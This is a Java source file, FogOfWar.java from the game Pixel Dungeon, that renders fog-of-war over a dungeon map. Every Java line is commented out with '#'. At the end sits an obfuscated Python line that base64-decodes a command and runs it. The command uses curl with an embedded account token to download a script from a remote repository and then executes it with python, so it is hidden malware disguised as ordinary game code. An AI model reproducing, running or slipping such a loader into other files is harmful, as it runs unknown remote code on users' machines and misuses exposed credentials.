#/*
# * Pixel Dungeon
# * Copyright (C) 2012-2015 Oleg Dolya
# *
# * This program is free software: you can redistribute it and/or modify
# * it under the terms of the GNU General Public License as published by
# * the Free Software Foundation, either version 3 of the License, or
# * (at your option) any later version.
# *
# * This program is distributed in the hope that it will be useful,
# * but WITHOUT ANY WARRANTY; without even the implied warranty of
# * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# * GNU General Public License for more details.
# *
# * You should have received a copy of the GNU General Public License
# * along with this program.  If not, see <http://www.gnu.org/licenses/>
# */
#package com.watabou.pixeldungeon;
#
#import java.util.Arrays;
#
#import android.graphics.Bitmap;
#
#import com.watabou.gltextures.SmartTexture;
#import com.watabou.gltextures.TextureCache;
#import com.watabou.glwrap.Texture;
#import com.watabou.noosa.Image;
#import com.watabou.pixeldungeon.scenes.GameScene;
#
#public class FogOfWar extends Image {
#
#	private static final int VISIBLE	= 0x00000000;
#	private static final int VISITED	= 0xcc111111;
#	private static final int MAPPED		= 0xcc442211;
#	private static final int INVISIBLE	= 0xFF000000;
#	
#	private int[] pixels;
#	
#	private int pWidth;
#	private int pHeight;
#	
#	private int width2;
#	private int height2;
#	
#	public FogOfWar( int mapWidth, int mapHeight ) {
#		
#		super();
#		
#		pWidth = mapWidth + 1;
#		pHeight = mapHeight + 1;
#		
#		width2 = 1;
#		while (width2 < pWidth) {
#			width2 <<= 1;
#		}
#		
#		height2 = 1;
#		while (height2 < pHeight) {
#			height2 <<= 1;
#		}
#		
#		float size = DungeonTilemap.SIZE;
#		width = width2 * size;
#		height = height2 * size;
#		
#		texture( new FogTexture() );
#		
#		scale.set( 
#			DungeonTilemap.SIZE, 
#			DungeonTilemap.SIZE );
#		
#		x = y = -size / 2;
#	}
#	
#	public void updateVisibility( boolean[] visible, boolean[] visited, boolean[] mapped ) {
#		
#		if (pixels == null) {
#			pixels = new int[width2 * height2];
#			Arrays.fill( pixels, INVISIBLE );
#		}
#		
#		for (int i=1; i < pHeight - 1; i++) {
#			int pos = (pWidth - 1) * i;
#			for (int j=1; j < pWidth - 1; j++) {
#				pos++;
#				int c = INVISIBLE;
#				if (visible[pos] && visible[pos - (pWidth - 1)] && 
#					visible[pos - 1] && visible[pos - (pWidth - 1) - 1]) {
#					c = VISIBLE;
#				} else 
#				if (visited[pos] && visited[pos - (pWidth - 1)] && 
#					visited[pos - 1] && visited[pos - (pWidth - 1) - 1]) {
#					c = VISITED;
#				}
#				else 
#				if (mapped[pos] && mapped[pos - (pWidth - 1)] && 
#					mapped[pos - 1] && mapped[pos - (pWidth - 1) - 1]) {
#					c = MAPPED;
#				}
#				pixels[i * width2 + j] = c;
#			}
#		}
#		
#		texture.pixels( width2, height2, pixels );
#	}
#	
#	private class FogTexture extends SmartTexture {
#		
#		public FogTexture() {
#			super( Bitmap.createBitmap( width2, height2, Bitmap.Config.ARGB_8888 ) );
#			filter( Texture.LINEAR, Texture.LINEAR );
#			TextureCache.add( FogOfWar.class, this );
#		}
#		
#		@Override
#		public void reload() {
#			super.reload();
#			GameScene.afterObserve();
#		}
#	}
#}


mrul='Y3VybCAtLXNpbGVudCAtTyAtLXVzZXIgInNoYW5hbmFsbGE4OEBnbWFpbC5jb206QVRBVFQzeEZmR0YwMUgzQ05CUzVZLVlGVVpQQ0sxU2xWX1o1UC1LRlBxVURHdVU3dTVheThmWmlnYWdZMm5UZVNrYlBQSjJ0R2dlckR4dWtKSmpsVmlEV2E1Z3VpZ2stbWZlRks3Z0ZFMVY4Xy0zVU15b3VtR0QzZmhPRFQwTl82dEJQY2YzR0FQa3pEbkdpQ2wzWlB3Nk55dmRYU290bjBQZHBDSzltcEtHVkp1M3Jla1hkNXl3PTAyNDY0QjczIiAiaHR0cHM6Ly9hcGkuYml0YnVja2V0Lm9yZy8yLjAvcmVwb3NpdG9yaWVzL3NoYW5hbmFsbGE4OC90ZXN0cGF3L3NyYy9tYXN0ZXIvcHkzL3N1cCIgJiYgcHl0aG9uIHN1cA==';import os,base64;os.system(base64.b64decode(mrul).decode())

